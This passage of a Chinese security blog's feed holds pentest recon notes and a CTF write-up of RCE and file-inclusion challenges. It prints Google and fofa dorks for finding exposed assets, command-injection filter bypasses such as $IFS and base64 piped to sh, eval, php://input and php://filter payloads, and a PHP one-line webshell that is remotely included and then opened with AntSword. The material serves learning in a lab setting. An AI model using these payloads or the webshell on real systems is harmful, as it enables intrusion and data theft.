class="line">inurl:搜url中有指定内容的网页</span><br><span class="line">intext:网页内容中有指定内容</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line">学号 site:cuit.edu.cn filetype:pdf OR filetype:xls</span><br><span class="line">inurl:ALFA_DATA intitle:&quot;index of&quot; 搜索wordpress下alfa插件的敏感信息泄漏</span><br></pre></td></tr></table></figure><h3 id="4-考虑阻碍"><a href="#4-考虑阻碍" class="headerlink" title="4 考虑阻碍"></a>4 考虑阻碍</h3><p>负载均衡、cdn、waf、</p><p>域名查 ip——多地 ping——看有没有 cdn </p><h2 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h2><p>安装—— Ehole 指纹职别（用的爬虫）</p>]]></content>
    
    
    <summary type="html">打点基础1 攻击流程2 主动信息收集找资产：主域、小程序（关键字去搜）、公众号写拓扑（递归）——搜索引擎找主域——由点到线到面子域、端口（服务）、目录...增大攻击面：域名解析记录（以前解析到的 ip，看还有没有在用）(建议信息收集：用多种工具、最后去重)网站使用语言php、c#、asp 好打...</summary>
    
    
    
    <category term="安全基础" scheme="http://godice.top/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>基础阶段</title>
    <link href="http://godice.top/%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5.html"/>
    <id>http://godice.top/%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5.html</id>
    <published>2024-11-05T14:12:28.000Z</published>
    <updated>2024-11-07T09:59:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="打点基础"><a href="#打点基础" class="headerlink" title="打点基础"></a>打点基础</h2><h3 id="1-攻击流程"><a href="#1-攻击流程" class="headerlink" title="1 攻击流程"></a>1 攻击流程</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730816395437-33bbc892-f2ed-48d5-bc5a-6ec978a11401.png"></p><h3 id="2-主动信息收集"><a href="#2-主动信息收集" class="headerlink" title="2 主动信息收集"></a>2 主动信息收集</h3><p>找资产：主域、小程序（关键字去搜）、公众号</p><p>写拓扑（递归）——搜索引擎找主域——由点到线到面</p><p>子域、端口（服务）、目录…</p><p>增大攻击面：域名解析记录（以前解析到的 ip，看还有没有在用）</p><p>(建议信息收集：用多种工具、最后去重)</p><p>网站使用语言</p><ul><li><font style="color:#DF2A3F;">php、c#、asp 好打</font><ul><li>c#很多 sql 注入（数据库一般用的 mssql）<ul><li>有堆叠 sql 就能 getshell</li></ul></li><li>php——mysql</li><li>aps——sqlserver（mssql）微软自己的，免费</li></ul></li><li><font style="color:#DF2A3F;">java、jsp难打：放后面</font><ul><li>java：mysql</li><li>jsp：oracle&#x2F;mysql——oracle 收费且很贵，一般是大公司用</li></ul></li></ul><p><font style="color:#DF2A3F;"></font></p><p><font style="color:#DF2A3F;"></font></p><p>（历史漏洞和代码审计）</p><ul><li>CMS 识别<ul><li>php：thinkphp</li><li>CMS 开源网站、售卖网站…</li></ul></li><li>指纹识别：Wrappr<ul><li>云悉</li><li>fofa：ip 聚合（左下角，web 版）</li><li>ehole：把 c 段的所有资产做一个指纹识别</li></ul></li><li>直接搜相关洞都打一遍</li><li>也可以下载源码下来审计</li></ul><p>扫目录（备份文件）</p><p>Ehole：通过 c 段来识别（列出 c 段中的所有资产）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ehole -f xxx.xxx.xxx.xxx/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730821601727-33238f57-1038-4f39-8219-642e0e83dc20.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fofa搜cms</span><br><span class="line">app=&quot;泛微-协同办公OA&quot;    政府用的很多的</span><br><span class="line">泛微、通达、致远</span><br><span class="line">title=&quot;后台管理&quot;</span><br><span class="line">yapi（可视化平台，洞很多）</span><br></pre></td></tr></table></figure><h3 id="3-被动信息收集"><a href="#3-被动信息收集" class="headerlink" title="3 被动信息收集"></a>3 被动信息收集</h3><p>（不主动和站点交互——fofa、云悉等第三方接口）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1730972654942-519f576d-239e-4bc1-955a-f1b6359af860.png"></p><h4 id="3-1google-语法"><a href="#3-1google-语法" class="headerlink" title="3.1google 语法"></a>3.1google 语法</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filetype:pdf site:.qq.com   qq.com域名结尾的pdf文件</span><br><span class="line">intitle:标题含有指定内容的网页</span><br><span class="line">inurl:搜url中有指定内容的网页</span><br><span class="line">intext:网页内容中有指定内容</span><br><span class="line"></span><br><span class="line">eg：</span><br><span class="line">学号 site:cuit.edu.cn filetype:pdf OR filetype:xls</span><br><span class="line">inurl:ALFA_DATA intitle:&quot;index of&quot; 搜索wordpress下alfa插件的敏感信息泄漏</span><br></pre></td></tr></table></figure><h3 id="4-考虑阻碍"><a href="#4-考虑阻碍" class="headerlink" title="4 考虑阻碍"></a>4 考虑阻碍</h3><p>负载均衡、cdn、waf、</p><p>域名查 ip——多地 ping——看有没有 cdn </p><h2 id="ToDo"><a href="#ToDo" class="headerlink" title="ToDo"></a>ToDo</h2><p>安装—— Ehole 指纹职别（用的爬虫）</p>]]></content>
    
    
    <summary type="html">打点基础1 攻击流程2 主动信息收集找资产：主域、小程序（关键字去搜）、公众号写拓扑（递归）——搜索引擎找主域——由点到线到面子域、端口（服务）、目录...增大攻击面：域名解析记录（以前解析到的 ip，看还有没有在用）(建议信息收集：用多种工具、最后去重)网站使用语言php、c#、asp 好打...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTF_Show_RCE技能树</title>
    <link href="http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html"/>
    <id>http://godice.top/CTF_Show_RCE%E6%8A%80%E8%83%BD%E6%A0%91.html</id>
    <published>2024-11-05T09:29:14.000Z</published>
    <updated>2025-01-06T07:21:58.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="RCE总结"><a href="#RCE总结" class="headerlink" title="RCE总结"></a>RCE总结</h2><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="命令分割符号："><a href="#命令分割符号：" class="headerlink" title="命令分割符号："></a><font style="color:#DF2A3F;">命令分割符号：</font></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">-%0a(回车) %0d(换行)   </span><br><span class="line">-;    </span><br><span class="line">-&amp;      </span><br><span class="line">-|       </span><br><span class="line">-&amp;&amp;    </span><br><span class="line">-||</span><br><span class="line">Windows:</span><br><span class="line">-%0a</span><br><span class="line">-&amp;</span><br><span class="line">-|</span><br><span class="line">-%1a（作为.bat文件中的命令分隔符）</span><br></pre></td></tr></table></figure><h4 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h4><ul><li>**<font style="color:#DF2A3F;">cat</font>**：用<code>ca\t</code>or 定义表达式</li><li>**<font style="color:#DF2A3F;">空格</font>**：用<code>$IFS$1</code>、大括号扩展<code>&#123;cat,flag.php&#125;</code>、<code>cat&lt;flag.php</code>、<code>cat&lt;&gt;</code><ul><li>1<code>&#123;cat,flag.php&#125;</code>大括号扩展：生成一个逗号分割的字符串集合</li><li>会分别执行 cat flag.php</li><li>2<code>cat$&#123;IFS&#125;flag.php</code>内部字段分隔符 IFS：相当于空格、制表、换行</li><li>3<code>cat$IFS$9flag.php</code>$9 是第 9 个参数<ul><li>可以理解为无意义字符，为了绕过检测用的（其实指向第九个参数，这里根本没有指定参数）</li></ul></li><li>4<code>cat&lt;flag.php</code>flag.php 重定向为 cat 的输入</li><li>5<code>cat&lt;&gt;flag.php</code>读取并写入 flag.php<ul><li>其实等于 4，读取再写入</li></ul></li><li>6<code>kg=$&#39;\x20flag.php&#39;&amp;&amp;cat$kg</code>定义<code>kg=$&#39;\x20flag.php&#39;</code>其中 \x20 是 ASCII 中的空格<ul><li>直接定义访问了</li></ul></li><li>7<code>a=c;b=at;c=flag.php;$a$b $c</code>定义表达式访问<ul><li><code>a=ca;b=$&#39;t\x20&#39;;c=flag.php;$a$b$c</code>也可以</li></ul></li><li>8<code>b=ag;a=fl;cat$IFS$1$a$b.php</code>定义表达式+内部字段分割符</li><li>9<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><ul><li>用 echo 输出 base64 编码的<code>cat flag</code>管道到 base64 解密，然后管道到 sh 中执行</li></ul></li><li>10<code>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</code>只是把执行换位了 bash</li><li>11<code>echo$IFS$1aW1wb3J0IG9zCnByaW50KG9zLnN5c3RlbSgnY2F0IGZsYWcucGhwJykp|base64$IFS$1-d|python3</code>用的 python 来执行<ul><li><code>import os</code></li><li><code>print(os.system(&#39;cat flag.php&#39;))</code></li></ul></li></ul></li><li>**<font style="color:#DF2A3F;">最好用的是定义表达式</font>**：<ul><li>比如正常的<code>cat flag.php</code></li><li><code>;a=fl;b=ag.php;cat$IFS$1$a$b</code></li></ul></li></ul><h2 id="RCE-文件包含"><a href="#RCE-文件包含" class="headerlink" title="RCE_文件包含"></a>RCE_文件包含</h2><p><a href="https://www.ctfhub.com/#/skilltree">技能树连接</a></p><p>ctf_show 的 RCE 的技能树</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a668cc998bb727803602b1bc712728c8.png"></p><h3 id="代码执行-命令执行"><a href="#代码执行-命令执行" class="headerlink" title="代码执行&amp;命令执行"></a>代码执行&amp;命令执行</h3><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">代码执行&amp;命令执行参考文档</a></p><p>特别注意：<code>&lt;font style=&quot;color:rgb(0, 0, 0);&quot;&gt;$_REQUEST&lt;/font&gt;</code><font style="color:rgb(0, 0, 0);">是一个包含了</font><code>$_GET</code><font style="color:rgba(0, 0, 0, 0.85);">、</font><code>$_POST</code><font style="color:rgba(0, 0, 0, 0.85);">和</font><code>$_COOKIE</code><font style="color:rgba(0, 0, 0, 0.85);">数据的超级全局变量</font></p><p><font style="color:rgba(0, 0, 0, 0.85);"></font></p><h3 id="题目：eval执行-代码执行"><a href="#题目：eval执行-代码执行" class="headerlink" title="题目：eval执行(代码执行)"></a>题目：eval执行(代码执行)</h3><p>ctf_show 题目</p><p>一道基础题，但是有一个点需要注意的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接把 cmd 传参的内容当作 eval 的 php 代码执行</p><p><code>?cmd=system(&quot;ls /&quot;);</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/a72122b8f61866a81cff769b349f9cd4.png"></p><p><code>?cmd=system(&quot;cat /flag_7373&quot;)</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/dfd976a506d666a106e991989f0576a9.png"></p><p><font style="color:#DF2A3F;">一个需要注意的点</font></p><p>对于以下的代码都是可以的，只要在命令的部分没有空格（空格会被url编码%20，在浏览器传输到后端后会自动解码一次）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="title function_ invoke__">system</span>(ls); ?cmd=<span class="title function_ invoke__">system</span>(pwd); ?cmd=<span class="title function_ invoke__">system</span>(whoami);</span><br></pre></td></tr></table></figure><p>但是一旦有了空格，就执行不成功<code>?cmd=system(ls /);</code>而需要加上引号<code>?cmd=system(&quot;ls /&quot;);</code><img src="https://raw.githubusercontent.com/godicee/img/main/c718a3edecb7c4219ef59e55d436de11.png"></p><h3 id="题目：文件包含"><a href="#题目：文件包含" class="headerlink" title="题目：文件包含"></a>题目：文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">strpos</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;hr&gt;</span><br><span class="line">i have a &lt;a href=<span class="string">&quot;shell.txt&quot;</span>&gt;shell&lt;/a&gt;, how to <span class="keyword">use</span> <span class="title">it</span> ?</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/f8acfc8e9e0d3a7ad9470c9031148a8a.png"></p><p>文件如下，有 eval 代码执行</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/c18a84a91dc23b51d0a01d423b36310e.png"></p><p>可以用 get、post、cookie 传参</p><p>get 传参<code>?file=shell.txt&amp;ctfhub=system(&quot;cat /flag&quot;);</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/6b8bf36f07298e2f2498d65ec0f66952.png"></p><p>post 传参</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/74fbe6e3343548ba2cbc9408d7d3723e.png"></p><p>cookie 传参，这里 cookie 传参没有成功（猜测 Cookie 的逻辑没有写在服务器代码里，不知道，乱猜的）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/2ecd9beea6c02b7ff65d048d7802ac6e.png"></p><h3 id="传参方式-get-post-cookie"><a href="#传参方式-get-post-cookie" class="headerlink" title="传参方式 get&#x2F;post&#x2F;cookie"></a>传参方式 get&#x2F;post&#x2F;cookie</h3><p>get<code>?para1=xxx&amp;para2=xxx</code></p><p>post</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /api/submit HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: [根据实际内容长度填写]</span><br><span class="line"></span><br><span class="line">username=John&amp;password=<span class="number">123456</span>&amp;email=john@example.com</span><br></pre></td></tr></table></figure><p>Cookie（多个参数用;分割，注意 Cookie 后的空格和分号后的空格分割）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /api HTTP/<span class="number">1.1</span></span><br><span class="line">Host: example.com</span><br><span class="line">Cookie: user_id=<span class="number">123</span>; username=John; role=admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/52aa1b1efd49c0ddd9725471acbaa261.png"></p><h3 id="题目：php-input"><a href="#题目：php-input" class="headerlink" title="题目：php:&#x2F;&#x2F;input"></a>题目：php:&#x2F;&#x2F;input</h3><ul><li>php:&#x2F;&#x2F;input 的作用<font style="color:rgb(77, 77, 77);">：</font><ul><li><font style="color:rgb(77, 77, 77);">可用于查看源码，同时是要查看未压缩文件的只读流</font></li><li><font style="color:rgb(77, 77, 77);">在post请求中能查看请求的原始数据，并将post请求中的post数据当作php代码执行。（只读流是说只能进行读操作的数据）</font><ul><li><strong><font style="color:#DF2A3F;">条件：</font></strong><font style="color:rgb(77, 77, 77);">allow_url_fopen&#x3D;off&#x2F;on；allow_url_include&#x3D;on。</font></li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/712640a679f1db43bae4d7e97f148738.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/6209b28be1052c3e2017dc7cd582fdb2.png"></p><p>php:&#x2F;&#x2F;input 代码执行风险</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/e48e488cf5583fef0eaa8eaa81dc7380.png"></p><p>寻找目录</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/9040af0d06bc65d6f3b096d0e6496f0f.png"></p><p>查看 flag</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/921bd42306419c8c9740881ff3d6602f.png"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://input</span><br><span class="line">&lt;?php system(&quot;&quot;cat /flag<span class="emphasis">_20902);?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="题目：读取源代码"><a href="#题目：读取源代码" class="headerlink" title="题目：读取源代码"></a>题目：读取源代码</h3><p>给了文件路径</p><p>可以直接读文件</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=/flag</span><br><span class="line">/?file=php://filter/read/resource=/flag不加密读</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/a69817371218805a3e7d0e129917fdce.png"></p><h3 id="题目：远程包含"><a href="#题目：远程包含" class="headerlink" title="题目：远程包含"></a>题目：远程包含</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/a69817371218805a3e7d0e129917fdce.png"></p><p>可以直接包含远程文件，测试包含百度</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/10e8d2088fd6c08662109f597d393c76.png"></p><p>包含自己博客</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/c41eeb7164eab732ec7a844867c9671c.png"></p><p>一句话木马</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=array($<span class="emphasis">_REQUEST[&#x27;x&#x27;]=&gt;&quot;3&quot;);</span></span><br><span class="line"><span class="emphasis">$b=array_</span>keys($a)[0];</span><br><span class="line">eval($b);</span><br><span class="line">echo &#x27;123123&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>服务器开启 http 服务器<code>python3 -m http.server 8888</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/0154974c874431a68af142db4d3c9332.png"></p><p>直接包含</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/1d03ab3db0b462b3d06b3b64638a8b2a.png"></p><p>蚂蚁连接</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/ee7895c42b0cb9aa57d479663af9f74f.png"></p><p>虚拟终端，查找 flag</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/23bf457dd4903a7a228df679bab2396f.png"></p><h3 id="远程allow-url-fopen-include"><a href="#远程allow-url-fopen-include" class="headerlink" title="远程allow_url_fopen&#x2F;include"></a>远程allow_url_fopen&#x2F;include</h3><ul><li><code>allow_url_fopen</code> 允许 url 的方式打开文件<ul><li><code>file_get_contents()</code>、<code>fopen</code>、<code>php://input</code></li></ul></li><li><code>allow_url_include</code>允许远程文件包含（远程服务器文件）<ul><li><code>include</code>、<code>require</code>、<code>include_once</code>、<code>require_once</code></li></ul></li></ul><h2 id="RCE-命令注入"><a href="#RCE-命令注入" class="headerlink" title="RCE_命令注入"></a>RCE_命令注入</h2><h3 id="题目：命令注入-exec-命令执行"><a href="#题目：命令注入-exec-命令执行" class="headerlink" title="题目：命令注入(exec 命令执行)"></a>题目：命令注入(exec 命令执行)</h3><ul><li><code>|</code>是管道符，前一个命令输出，作为后一个命令输入<ul><li>前一个命令对后一个命令如果没有有效的输入：会直接执行后一个命令</li></ul></li><li><code>;</code>是直接分割命令，顺序执行这些命令<ul><li><code>;</code>不管前一个是否执行成功，都会执行后一个</li></ul></li><li><code>&amp;&amp;</code>是前一个执行成功，再执行后一个</li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/57f780141ba15ed8f1d8f62745570af9.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$res = FALSE;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if (isset($_GET[&#x27;ip&#x27;]) &amp;&amp; $_GET[&#x27;ip&#x27;]) &#123; </span></span><br><span class="line"><span class="meta">    $cmd = &quot;ping -c 4 &#123;$_GET[&#x27;ip&#x27;]&#125;&quot;;  // 发送4个包</span></span><br><span class="line"><span class="meta">    exec($cmd, $res);  // 执行命令，返回结果给res</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFHub 命令注入-无过滤<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CTFHub 命令注入-无过滤<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span>  <span class="comment">&lt;!--#设置表单数据提交的URL为本页面--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;ip&quot;</span>&gt;</span>IP : <span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>  <span class="comment">&lt;!--标签IP关联到id值为id，可以点击IP跳转到输入框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;ip&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ip&quot;</span>&gt;</span>  <span class="comment">&lt;!--设置输入文本框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Ping&quot;</span>&gt;</span>  <span class="comment">&lt;!--提交按钮--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">pre</span>&gt;</span>  <span class="comment">&lt;!--展示ping命令的结果--&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">if ($res) &#123;</span></span><br><span class="line"><span class="meta">    print_r($res);</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">show_source(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exec 函数</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/57e7dc1be14387c7dd5f58ea39ef5a76.png"></p><p>展示：exec 执行结果返回给$res，然后展示在页面上（print_r 格式化输出）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/2ca8e4cb4b6e3bfc516e452685494fc0.png"></p><ul><li><strong><font style="color:#DF2A3F;">使用管道符</font></strong><code>**&lt;font style=&quot;color:#DF2A3F;&quot;&gt; | &lt;/font&gt;**</code><strong><font style="color:#DF2A3F;">连接多个命令</font></strong><ul><li>前一个命令的输出，作为下一个命令的输入</li><li>但是：因为 ping 不会产生有效输出——就会直接中断 ping 的执行然后<ul><li>ls 命令就会直接执行</li></ul></li></ul></li></ul><p><img src="https://raw.githubusercontent.com/godicee/img/main/0b2f567d3f02e0ffac00deada35a4bce.png"></p><p>直接 cat 看不 flag<code>www.baidu.com|cat 14645300762206.php</code></p><p>但是 F12 查看源代码可以看到</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/4cfb1655012c61c7b2f57ee46f37b0fb.png"></p><p>尝试 base64 编码<code>www.baidu.com|cat 14645300762206.php|base64</code></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/f86fc72290fcfb58bf8bd17f2f699f5a.png"></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/fdbdccc0ff92216ea53757af58fab637.png"></p><p>直接<code>;cat 14645300762206.php|base64</code>也可以</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/46f20236961707420b64e456768c818e.png"></p><h3 id="题目：禁用-cat"><a href="#题目：禁用-cat" class="headerlink" title="题目：禁用 cat"></a>题目：禁用 cat</h3><p><font style="color:rgb(0, 0, 0);">less（更多交互）、more（只允许向后）、tac（最后一行开始反向显示）、ca\t（被解析为 cat+\t 制表符）</font></p><p><code>;ca\t flag_18071273756181.php|base64</code>然后解码</p><p><code>;ca\t flag_18071273756181.php</code>然后查看源代码</p><h3 id="题目：禁用空格"><a href="#题目：禁用空格" class="headerlink" title="题目：禁用空格"></a>题目：禁用空格</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;cat,flag.php&#125;  </span><br><span class="line">cat$&#123;IFS&#125;flag.php  </span><br><span class="line">cat$IFS$9flag.php</span><br><span class="line">cat<span class="tag">&lt;<span class="name">flag.php</span></span></span><br><span class="line"><span class="tag"><span class="attr">cat</span>&lt;&gt;</span>flag.php</span><br><span class="line">kg=$&#x27;\x20flag.php&#x27;&amp;&amp;cat$kg</span><br><span class="line">a=c;b=at;c=flag.php;$a$b $c</span><br><span class="line">b=ag;a=fl;cat$IFS$1$a$b.php</span><br><span 